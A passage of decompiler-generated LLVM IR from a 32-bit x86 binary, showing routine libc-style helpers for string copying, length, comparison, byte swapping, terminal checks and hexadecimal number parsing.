  store i32 %v0_804d514, i32* @edi, align 4
  ret i32 %v3_804d51e
}

define i32 @function_804d528(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d528:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d529 = load i32, i32* @esi, align 4
  store i32 %v0_804d529, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d535 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d535, i32* %edi.global-to-local, align 4
  %v1_804d539 = add i32 %arg3, 1
  store i32 %v1_804d539, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d53a

dec_label_pc_804d53a:                             ; preds = %dec_label_pc_804d53d, %dec_label_pc_804d528
  %v3_804d53e = phi i32 [ %v4_804d535, %dec_label_pc_804d528 ], [ %v8_804d53e, %dec_label_pc_804d53d ]
  %v0_804d53a = phi i32 [ %v1_804d539, %dec_label_pc_804d528 ], [ %v0_804d53a.pre, %dec_label_pc_804d53d ]
  %v1_804d53a = add i32 %v0_804d53a, -1
  %v8_804d53a = icmp eq i32 %v1_804d53a, 0
  store i32 %v1_804d53a, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d53a, label %.loopexit, label %dec_label_pc_804d53d

dec_label_pc_804d53d:                             ; preds = %dec_label_pc_804d53a
  %v0_804d53d = load i32, i32* %esi.global-to-local, align 4
  %v1_804d53d = inttoptr i32 %v0_804d53d to i8*
  %v2_804d53d = load i8, i8* %v1_804d53d, align 1
  %v10_804d53d = load i1, i1* @df, align 1
  %v11_804d53d = select i1 %v10_804d53d, i32 -1, i32 1
  %v12_804d53d = add i32 %v11_804d53d, %v0_804d53d
  store i32 %v12_804d53d, i32* %esi.global-to-local, align 4
  %v4_804d53e = inttoptr i32 %v3_804d53e to i8*
  store i8 %v2_804d53d, i8* %v4_804d53e, align 1
  %v5_804d53e = load i32, i32* %edi.global-to-local, align 4
  %v6_804d53e = load i1, i1* @df, align 1
  %v7_804d53e = select i1 %v6_804d53e, i32 -1, i32 1
  %v8_804d53e = add i32 %v7_804d53e, %v5_804d53e
  store i32 %v8_804d53e, i32* %edi.global-to-local, align 4
  %v6_804d53f = icmp eq i8 %v2_804d53d, 0
  %v1_804d541 = icmp eq i1 %v6_804d53f, false
  %v0_804d53a.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804d541, label %dec_label_pc_804d53a, label %dec_label_pc_804d543

dec_label_pc_804d543:                             ; preds = %dec_label_pc_804d53d
  %v1_804d543 = add i32 %v0_804d53a.pre, -1
  store i32 %v1_804d543, i32* %ecx.global-to-local, align 4
  %v2_804d544 = sext i8 %v2_804d53d to i32
  %v4_804d544 = inttoptr i32 %v8_804d53e to i8*
  %v5_804d544 = call i8* @_memset(i8* %v4_804d544, i32 %v2_804d544, i32 %v1_804d543)
  %v6_804d544 = ptrtoint i8* %v5_804d544 to i32
  store i32 %v6_804d544, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804d53a, %dec_label_pc_804d543
  %v2_804d54a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d54a, i32* @edx, align 4
  %v2_804d54b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d54b, i32* @esi, align 4
  ret i32 %v4_804d535

; uselistorder directives
  uselistorder i32 %v8_804d53e, { 0, 2, 1 }
  uselistorder i8 %v2_804d53d, { 0, 2, 1 }
  uselistorder i32 %v1_804d53a, { 1, 0 }
  uselistorder i32 %v4_804d535, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_804d550() local_unnamed_addr {
dec_label_pc_804d550:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804d550 = ptrtoint i8* %tmp4 to i32
  %v8_804d5635 = icmp eq i32 %tmp, 0
  %v1_804d5647 = icmp eq i1 %v8_804d5635, false
  br i1 %v1_804d5647, label %dec_label_pc_804d55d, label %dec_label_pc_804d566

dec_label_pc_804d55d:                             ; preds = %dec_label_pc_804d550, %dec_label_pc_804d562
  %v1_804d5639 = phi i32 [ %v1_804d563, %dec_label_pc_804d562 ], [ %tmp, %dec_label_pc_804d550 ]
  %v0_804d5668 = phi i32 [ %v1_804d562, %dec_label_pc_804d562 ], [ %v4_804d550, %dec_label_pc_804d550 ]
  %v1_804d55d = inttoptr i32 %v0_804d5668 to i8*
  %v2_804d55d = load i8, i8* %v1_804d55d, align 1
  %v3_804d55d = icmp eq i8 %v2_804d55d, 0
  br i1 %v3_804d55d, label %dec_label_pc_804d566, label %dec_label_pc_804d562

dec_label_pc_804d562:                             ; preds = %dec_label_pc_804d55d
  %v1_804d562 = add i32 %v0_804d5668, 1
  %v1_804d563 = add i32 %v1_804d5639, -1
  %v8_804d563 = icmp eq i32 %v1_804d563, 0
  %v1_804d564 = icmp eq i1 %v8_804d563, false
  br i1 %v1_804d564, label %dec_label_pc_804d55d, label %dec_label_pc_804d566

dec_label_pc_804d566:                             ; preds = %dec_label_pc_804d562, %dec_label_pc_804d55d, %dec_label_pc_804d550
  %v0_804d566.lcssa = phi i32 [ %v4_804d550, %dec_label_pc_804d550 ], [ %v0_804d5668, %dec_label_pc_804d55d ], [ %v1_804d562, %dec_label_pc_804d562 ]
  %v2_804d566 = sub i32 %v0_804d566.lcssa, %v4_804d550
  ret i32 %v2_804d566

; uselistorder directives
  uselistorder i32 %v1_804d563, { 1, 0 }
  uselistorder i32 %v0_804d5668, { 0, 2, 1 }
  uselistorder i32 %v4_804d550, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d55d, { 1, 0 }
}

define i32 @function_804d56c() local_unnamed_addr {
dec_label_pc_804d56c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804d57d = call i32 @function_804d58c(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804d585 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d585
}

define i32 @function_804d58c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d58c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804d59e = icmp ugt i32 %arg1, 124
  br i1 %v6_804d59e, label %dec_label_pc_804d5bb, label %dec_label_pc_804d5a0

dec_label_pc_804d5a0:                             ; preds = %dec_label_pc_804d58c
  store i32 ptrtoint ([8 x i8]* @global_var_8053b40.132 to i32), i32* @esi, align 4
  %v1_804d5b04 = icmp eq i32 %arg1, 0
  %v1_804d5b211 = icmp eq i1 %v1_804d5b04, false
  br i1 %v1_804d5b211, label %dec_label_pc_804d5a9, label %dec_label_pc_804d5b4

dec_label_pc_804d5a9:                             ; preds = %dec_label_pc_804d5a0, %dec_label_pc_804d5a9
  %v0_804d5ac = phi i32 [ %v3_804d5ac, %dec_label_pc_804d5a9 ], [ %arg1, %dec_label_pc_804d5a0 ]
  %v0_804d5af = phi i32 [ %v1_804d5af, %dec_label_pc_804d5a9 ], [ ptrtoint ([8 x i8]* @global_var_8053b40.132 to i32), %dec_label_pc_804d5a0 ]
  %v1_804d5a9 = inttoptr i32 %v0_804d5af to i8*
  %v2_804d5a9 = load i8, i8* %v1_804d5a9, align 1
  %v7_804d5a9 = icmp eq i8 %v2_804d5a9, 0
  %v2_804d5ac = zext i1 %v7_804d5a9 to i32
  %v3_804d5ac = add i32 %v2_804d5ac, %v0_804d5ac
  %v16_804d5ac = icmp eq i32 %v3_804d5ac, 0
  %v1_804d5af = add i32 %v0_804d5af, 1
  store i32 %v1_804d5af, i32* @esi, align 4
  %v1_804d5b2 = icmp eq i1 %v16_804d5ac, false
  br i1 %v1_804d5b2, label %dec_label_pc_804d5a9, label %dec_label_pc_804d5b4

dec_label_pc_804d5b4:                             ; preds = %dec_label_pc_804d5a9, %dec_label_pc_804d5a0
  %v0_804d5b6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053b40.132 to i32), %dec_label_pc_804d5a0 ], [ %v1_804d5af, %dec_label_pc_804d5a9 ]
  store i32 0, i32* @ebp, align 4
  %v1_804d5b6 = inttoptr i32 %v0_804d5b6 to i8*
  %v2_804d5b6 = load i8, i8* %v1_804d5b6, align 1
  %v3_804d5b6 = icmp eq i8 %v2_804d5b6, 0
  %v1_804d5b9 = icmp eq i1 %v3_804d5b6, false
  br i1 %v1_804d5b9, label %dec_label_pc_804d5b4.dec_label_pc_804d5ea_crit_edge, label %dec_label_pc_804d5bb

dec_label_pc_804d5b4.dec_label_pc_804d5ea_crit_edge: ; preds = %dec_label_pc_804d5b4
  br label %dec_label_pc_804d5ea

dec_label_pc_804d5bb:                             ; preds = %dec_label_pc_804d5b4, %dec_label_pc_804d58c
  %v1_804d5be = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804d5cf = bitcast i32* %stack_var_-17 to i8*
  %v7_804d5cf = call i32 @function_8050274(i8* %v6_804d5cf, i32 %arg1, i32 %v1_804d5be, i32 -10, i32 0)
  %v1_804d5de = add i32 %v7_804d5cf, -14
  store i32 %v1_804d5de, i32* @esi, align 4
  %v5_804d5e1 = inttoptr i32 %v1_804d5de to i8*
  store i8* %v5_804d5e1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804d5de to i16*
  %v6_804d5e2 = call i32 @function_804d4b8(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8053b22.133 to i32), i32 14)
  %v1_804d5f4.pre = load i32, i32* @edi, align 4
  %v0_804d5fa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d5ea

dec_label_pc_804d5ea:                             ; preds = %dec_label_pc_804d5b4.dec_label_pc_804d5ea_crit_edge, %dec_label_pc_804d5bb
  %v0_804d5fa = phi i32 [ %v0_804d5b6, %dec_label_pc_804d5b4.dec_label_pc_804d5ea_crit_edge ], [ %v0_804d5fa.pre, %dec_label_pc_804d5bb ]
  %v1_804d5f4 = phi i32 [ %arg3, %dec_label_pc_804d5b4.dec_label_pc_804d5ea_crit_edge ], [ %v1_804d5f4.pre, %dec_label_pc_804d5bb ]
  %v4_804d5ea = icmp eq i32 %arg2, 0
  %v3_804d5f4 = select i1 %v4_804d5ea, i32 0, i32 %v1_804d5f4
  store i32 %v3_804d5f4, i32* @edi, align 4
  %v5_804d5fa = inttoptr i32 %v0_804d5fa to i8*
  store i8* %v5_804d5fa, i8** %stack_var_-108, align 4
  %v3_804d5fb = call i32 @function_804d514(i8* %v5_804d5fa)
  %v1_804d603 = add i32 %v3_804d5fb, 1
  store i32 %v1_804d603, i32* %ebx.global-to-local, align 4
  %v1_804d606 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804d603, %v1_804d606
  br i1 %tmp, label %dec_label_pc_804d60a, label %dec_label_pc_804d611

dec_label_pc_804d60a:                             ; preds = %dec_label_pc_804d5ea
  store i32 %v1_804d606, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804d611

dec_label_pc_804d611:                             ; preds = %dec_label_pc_804d5ea, %dec_label_pc_804d60a
  %v0_804d616 = phi i32 [ %v1_804d603, %dec_label_pc_804d5ea ], [ %v1_804d606, %dec_label_pc_804d60a ]
  %v1_804d611 = icmp eq i32 %v0_804d616, 0
  br i1 %v1_804d611, label %dec_label_pc_804d62d, label %dec_label_pc_804d615

dec_label_pc_804d615:                             ; preds = %dec_label_pc_804d611
  %v0_804d617 = load i32, i32* @esi, align 4
  %v8_804d618 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804d618, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804d61c = call i32 @function_804d4b8(i16* %tmp45, i32 %v0_804d617, i32 %v0_804d616)
  %v1_804d628 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d628 = add i32 %arg2, -1
  %v3_804d628 = add i32 %v2_804d628, %v1_804d628
  %v4_804d628 = inttoptr i32 %v3_804d628 to i8*
  store i8 0, i8* %v4_804d628, align 1
  br label %dec_label_pc_804d62d

dec_label_pc_804d62d:                             ; preds = %dec_label_pc_804d611, %dec_label_pc_804d615
  %v0_804d62d = load i32, i32* @ebp, align 4
  %v1_804d62d = icmp eq i32 %v0_804d62d, 0
  br i1 %v1_804d62d, label %dec_label_pc_804d638, label %dec_label_pc_804d631

dec_label_pc_804d631:                             ; preds = %dec_label_pc_804d62d
  %v0_804d631 = load i8*, i8** %stack_var_-108, align 4
  %v1_804d631 = ptrtoint i8* %v0_804d631 to i32
  %v2_804d631 = call i32 @function_804baa4(i32 %v1_804d631)
  %v0_804d636 = load i32, i32* @ebp, align 4
  %v2_804d636 = inttoptr i32 %v2_804d631 to i32*
  store i32 %v0_804d636, i32* %v2_804d636, align 4
  %v0_804d63b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d638

dec_label_pc_804d638:                             ; preds = %dec_label_pc_804d62d, %dec_label_pc_804d631
  %v0_804d63b = phi i32 [ 0, %dec_label_pc_804d62d ], [ %v0_804d63b.pre, %dec_label_pc_804d631 ]
  ret i32 %v0_804d63b

; uselistorder directives
  uselistorder i32 %v1_804d606, { 1, 2, 0 }
  uselistorder i32 %v1_804d603, { 1, 0, 2 }
  uselistorder i32 %v1_804d5af, { 0, 2, 1 }
  uselistorder i32 %v3_804d5ac, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8053b40.132 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804d638, { 1, 0 }
  uselistorder label %dec_label_pc_804d62d, { 1, 0 }
  uselistorder label %dec_label_pc_804d611, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ea, { 1, 0 }
  uselistorder label %dec_label_pc_804d5a9, { 1, 0 }
}

define i32 @function_804d644(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d644:
  %v2_804d654 = inttoptr i32 %arg2 to i8*
  %v3_804d654 = call i32 @function_80509f0(i8* %v2_804d654, i32 %arg1)
  ret i32 %v3_804d654
}

define i32 @function_804d65c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d65c:
  %v0_804d65d = load i32, i32* bitcast (i32** @global_var_8056448.134 to i32*), align 8
  %v4_804d666 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d66e

dec_label_pc_804d66e:                             ; preds = %dec_label_pc_804d68b, %dec_label_pc_804d65c
  %storemerge = phi i32 [ %v4_804d666, %dec_label_pc_804d65c ], [ %v1_804d68c, %dec_label_pc_804d68b ]
  %v0_804d68c = phi i32 [ %v4_804d666, %dec_label_pc_804d65c ], [ %v1_804d68c, %dec_label_pc_804d68b ]
  %v0_804d6917 = phi i32 [ 0, %dec_label_pc_804d65c ], [ %v0_804d6918, %dec_label_pc_804d68b ]
  %v0_804d68b = phi i32 [ %arg2, %dec_label_pc_804d65c ], [ %v1_804d68b, %dec_label_pc_804d68b ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804d66e = icmp eq i32 %v0_804d68c, %v0_804d68b
  %.pre = inttoptr i32 %v0_804d68c to i8*
  br i1 %v12_804d66e, label %dec_label_pc_804d686, label %dec_label_pc_804d672

dec_label_pc_804d672:                             ; preds = %dec_label_pc_804d66e
  %v2_804d672 = load i8, i8* %.pre, align 1
  %v3_804d672 = zext i8 %v2_804d672 to i32
  %v2_804d675 = mul nuw nsw i32 %v3_804d672, 2
  %v3_804d675 = add i32 %v2_804d675, %v0_804d65d
  %v4_804d675 = inttoptr i32 %v3_804d675 to i16*
  %v5_804d675 = load i16, i16* %v4_804d675, align 2
  %v6_804d675 = sext i16 %v5_804d675 to i32
  %v1_804d679 = inttoptr i32 %v0_804d68b to i8*
  %v2_804d679 = load i8, i8* %v1_804d679, align 1
  %v3_804d679 = zext i8 %v2_804d679 to i32
  %v2_804d67c = mul nuw nsw i32 %v3_804d679, 2
  %v3_804d67c = add i32 %v2_804d67c, %v0_804d65d
  %v4_804d67c = inttoptr i32 %v3_804d67c to i16*
  %v5_804d67c = load i16, i16* %v4_804d67c, align 2
  %v6_804d67c = sext i16 %v5_804d67c to i32
  %v2_804d680 = sub nsw i32 %v6_804d675, %v6_804d67c
  %v12_804d680 = icmp eq i32 %v2_804d680, 0
  store i32 %v2_804d680, i32* @edx, align 4
  %v1_804d684 = icmp eq i1 %v12_804d680, false
  br i1 %v1_804d684, label %dec_label_pc_804d68f, label %dec_label_pc_804d686

dec_label_pc_804d686:                             ; preds = %dec_label_pc_804d66e, %dec_label_pc_804d672
  %v0_804d6918 = phi i32 [ %v2_804d680, %dec_label_pc_804d672 ], [ %v0_804d6917, %dec_label_pc_804d66e ]
  %v2_804d686 = load i8, i8* %.pre, align 1
  %v3_804d686 = icmp eq i8 %v2_804d686, 0
  br i1 %v3_804d686, label %dec_label_pc_804d68f, label %dec_label_pc_804d68b

dec_label_pc_804d68b:                             ; preds = %dec_label_pc_804d686
  %v1_804d68b = add i32 %v0_804d68b, 1
  %v1_804d68c = add i32 %v0_804d68c, 1
  br label %dec_label_pc_804d66e

dec_label_pc_804d68f:                             ; preds = %dec_label_pc_804d686, %dec_label_pc_804d672
  %v0_804d691 = phi i32 [ %v0_804d6918, %dec_label_pc_804d686 ], [ %v2_804d680, %dec_label_pc_804d672 ]
  ret i32 %v0_804d691

; uselistorder directives
  uselistorder i32 %v1_804d68c, { 1, 0 }
  uselistorder i32 %v0_804d6918, { 1, 0 }
  uselistorder i32 %v2_804d680, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d68b, { 1, 2, 0 }
  uselistorder i32 %v0_804d68c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d686, { 1, 0 }
}

define i32 @function_804d694(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d694:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d694 = load i32, i32* @edi, align 4
  %v0_804d695 = load i32, i32* @esi, align 4
  %v0_804d696 = load i32, i32* @ebx, align 4
  store i32 %v0_804d696, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d69f = inttoptr i32 %arg1 to i8*
  %v2_804d69f = call i32 @function_804d514(i8* %v1_804d69f)
  %v1_804d6a4 = add i32 %v2_804d69f, 1
  store i32 %v1_804d6a4, i32* @esi, align 4
  %v1_804d6aa = call i32 @function_804ddba(i32 %v1_804d6a4)
  %v1_804d6b2 = icmp eq i32 %v1_804d6aa, 0
  store i32 %v1_804d6aa, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d6b2, label %dec_label_pc_804d6c4, label %dec_label_pc_804d6b8

dec_label_pc_804d6b8:                             ; preds = %dec_label_pc_804d694
  %v0_804d6b9 = load i32, i32* @esi, align 4
  %v0_804d6ba = load i32, i32* @edi, align 4
  %v3_804d6bc = inttoptr i32 %v1_804d6aa to i16*
  %v4_804d6bc = call i32 @function_804d4b8(i16* %v3_804d6bc, i32 %v0_804d6ba, i32 %v0_804d6b9)
  %v0_804d6c4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d6c4

dec_label_pc_804d6c4:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804d6b8
  %v0_804d6c4 = phi i32 [ 0, %dec_label_pc_804d694 ], [ %v0_804d6c4.pre, %dec_label_pc_804d6b8 ]
  %v2_804d6c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d6c6, i32* @ebx, align 4
  store i32 %v0_804d695, i32* @esi, align 4
  store i32 %v0_804d694, i32* @edi, align 4
  ret i32 %v0_804d6c4

; uselistorder directives
  uselistorder i32 %v1_804d6aa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d6c4, { 1, 0 }
}

define i32 @function_804d6e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d6e8:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d6f4 = call i32 @function_804d708(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d6f9 = icmp eq i32 %v3_804d6f4, 0
  %v1_804d6fb = zext i1 %v1_804d6f9 to i32
  ret i32 %v1_804d6fb
}

define i32 @function_804d708(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804d708:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d708 = load i32, i32* @esi, align 4
  %v0_804d709 = load i32, i32* @ebx, align 4
  store i32 %v0_804d709, i32* %stack_var_-8, align 4
  %v2_804d70d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d70d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d71f = call i32 @function_804b94c(i32 %arg1, i32 21505, i32 %v2_804d70d)
  store i32 %v3_804d71f, i32* %eax.global-to-local, align 4
  %v1_804d727 = icmp eq i32 %v3_804d71f, 0
  store i32 %v3_804d71f, i32* @esi, align 4
  %v1_804d72b = icmp eq i1 %v1_804d727, false
  br i1 %v1_804d72b, label %dec_label_pc_804d770, label %dec_label_pc_804d72d

dec_label_pc_804d72d:                             ; preds = %dec_label_pc_804d708
  %v3_804d72d = load i32, i32* %stack_var_-44, align 4
  %v1_804d731 = load i32, i32* @ebx, align 4
  %v2_804d731 = inttoptr i32 %v1_804d731 to i32*
  store i32 %v3_804d72d, i32* %v2_804d731, align 4
  %v1_804d737 = load i32, i32* @ebx, align 4
  %v2_804d737 = add i32 %v1_804d737, 4
  %v3_804d737 = inttoptr i32 %v2_804d737 to i32*
  %v1_804d73e = load i32, i32* @ebx, align 4
  %v2_804d73e = add i32 %v1_804d73e, 8
  %v3_804d73e = inttoptr i32 %v2_804d73e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d745 = load i32, i32* @ebx, align 4
  %v2_804d745 = add i32 %v1_804d745, 12
  %v3_804d745 = inttoptr i32 %v2_804d745 to i32*
  store i32 %tmp3, i32* %v3_804d745, align 4
  %v4_804d748 = zext i8 %tmp to i32
  %v5_804d748 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d748 = and i32 %v5_804d748, -256
  %v7_804d748 = or i32 %v6_804d748, %v4_804d748
  store i32 %v7_804d748, i32* %eax.global-to-local, align 4
  %v2_804d74c = load i32, i32* @ebx, align 4
  %v3_804d74c = add i32 %v2_804d74c, 16
  %v4_804d74c = inttoptr i32 %v3_804d74c to i8*
  store i8 %tmp, i8* %v4_804d74c, align 1
  %v0_804d74f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d752 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d757 = load i32, i32* @ebx, align 4
  %v1_804d757 = add i32 %v0_804d757, 17
  store i32 %v1_804d757, i32* %eax.global-to-local, align 4
  %v4_804d75b = call i32 @function_8050a18(i32 %v1_804d757, i32 %v2_804d752, i32 19, i32 %v0_804d74f)
  store i32 %v4_804d75b, i32* %eax.global-to-local, align 4
  %v3_804d768 = inttoptr i32 %v4_804d75b to i8*
  %v4_804d768 = call i32 @function_804d4e0(i8* %v3_804d768, i32 0, i32 13)
  store i32 %v4_804d768, i32* %eax.global-to-local, align 4
  %v0_804d773.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d770

dec_label_pc_804d770:                             ; preds = %dec_label_pc_804d708, %dec_label_pc_804d72d
  %v0_804d773 = phi i32 [ %v3_804d71f, %dec_label_pc_804d708 ], [ %v0_804d773.pre, %dec_label_pc_804d72d ]
  store i32 %v0_804d773, i32* %eax.global-to-local, align 4
  %v2_804d775 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d775, i32* @ebx, align 4
  store i32 %v0_804d708, i32* @esi, align 4
  ret i32 %v0_804d773

; uselistorder directives
  uselistorder i32 %v0_804d773, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d770, { 1, 0 }
}

define i32 @function_804d778(i16 %arg1) local_unnamed_addr {
dec_label_pc_804d778:
  %v3_804d77d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804d77d = zext i16 %v3_804d77d to i32
  ret i32 %v4_804d77d
}

define i32 @function_804d785(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d785:
  %v1_804d789 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d789
}

define i32 @function_804d799(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d799:
  %v1_804d79d = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d79d
}

define i32 @function_804d7a0(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d7a0:
  %v4_804d7a7 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d7ba

dec_label_pc_804d7ba:                             ; preds = %dec_label_pc_804d862, %dec_label_pc_804d7a0
  %v3_804d84b = phi i32 [ 0, %dec_label_pc_804d7a0 ], [ %v5_804d850, %dec_label_pc_804d862 ]
  %v2_804d859 = phi i32 [ 0, %dec_label_pc_804d7a0 ], [ %v3_804d859, %dec_label_pc_804d862 ]
  %v0_804d7c8 = phi i32 [ %v4_804d7a7, %dec_label_pc_804d7a0 ], [ %v1_804d862, %dec_label_pc_804d862 ]
  %v1_804d7ba = inttoptr i32 %v0_804d7c8 to i8*
  %v2_804d7ba = load i8, i8* %v1_804d7ba, align 1
  %v8_804d7ba = icmp eq i8 %v2_804d7ba, 48
  br i1 %v8_804d7ba, label %dec_label_pc_804d7c8, label %dec_label_pc_804d7bf

dec_label_pc_804d7bf:                             ; preds = %dec_label_pc_804d7ba
  br label %dec_label_pc_804d7e7

dec_label_pc_804d7c8:                             ; preds = %dec_label_pc_804d7ba
  %v1_804d7c8 = add i32 %v0_804d7c8, 1
  %v1_804d7c9 = inttoptr i32 %v1_804d7c8 to i8*
  %v2_804d7c9 = load i8, i8* %v1_804d7c9, align 1
  %v3_804d7c9 = zext i8 %v2_804d7c9 to i32
  %v4_804d7c9 = load i32, i32* @eax, align 4
  %v5_804d7c9 = and i32 %v4_804d7c9, -256
  %v6_804d7c9 = or i32 %v5_804d7c9, %v3_804d7c9
  store i32 %v6_804d7c9, i32* @eax, align 4
  %v10_804d7cb = icmp eq i8 %v2_804d7c9, 120
  br i1 %v10_804d7cb, label %dec_label_pc_804d7df, label %dec_label_pc_804d7cf

dec_label_pc_804d7cf:                             ; preds = %dec_label_pc_804d7c8
  %v10_804d7cf = icmp eq i8 %v2_804d7c9, 88
  br i1 %v10_804d7cf, label %dec_label_pc_804d7df, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7cf
  br label %dec_label_pc_804d7e7

dec_label_pc_804d7df:                             ; preds = %dec_label_pc_804d7cf, %dec_label_pc_804d7c8
  %v1_804d7df = add i32 %v0_804d7c8, 2
  br label %dec_label_pc_804d7e7

dec_label_pc_804d7e7:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7bf, %dec_label_pc_804d7df
  %v0_804d83b4 = phi i32 [ %v1_804d7c8, %dec_label_pc_804d7d3 ], [ %v0_804d7c8, %dec_label_pc_804d7bf ], [ %v1_804d7df, %dec_label_pc_804d7df ]
  %v0_804d84113 = phi i32 [ 1, %dec_label_pc_804d7d3 ], [ 0, %dec_label_pc_804d7bf ], [ 0, %dec_label_pc_804d7df ]
  %v0_804d81010 = phi i32 [ 8, %dec_label_pc_804d7d3 ], [ 10, %dec_label_pc_804d7bf ], [ 16, %dec_label_pc_804d7df ]
  %v4_804d83b.pre = load i32, i32* @edx, align 4
  %v1_804d83b40 = inttoptr i32 %v0_804d83b4 to i8*
  %v2_804d83b41 = load i8, i8* %v1_804d83b40, align 1
  %v3_804d83b42 = zext i8 %v2_804d83b41 to i32
  %v5_804d83b43 = and i32 %v4_804d83b.pre, -256
  %v6_804d83b44 = or i32 %v3_804d83b42, %v5_804d83b43
  store i32 %v6_804d83b44, i32* @edx, align 4
  %v4_804d83d45 = icmp eq i8 %v2_804d83b41, 0
  %v1_804d83f47 = icmp eq i1 %v4_804d83d45, false
  br i1 %v1_804d83f47, label %dec_label_pc_804d7eb.lr.ph, label %dec_label_pc_804d841

dec_label_pc_804d7eb.lr.ph:                       ; preds = %dec_label_pc_804d7e7
  %v6_804d810 = icmp eq i32 %v0_804d81010, 16
  %v1_804d813 = icmp eq i1 %v6_804d810, false
  %v9_804d7fb = icmp eq i32 %v0_804d81010, 8
  %v1_804d7fe = icmp eq i1 %v9_804d7fb, false
  br label %dec_label_pc_804d7eb

dec_label_pc_804d7eb:                             ; preds = %dec_label_pc_804d7eb.lr.ph, %dec_label_pc_804d835
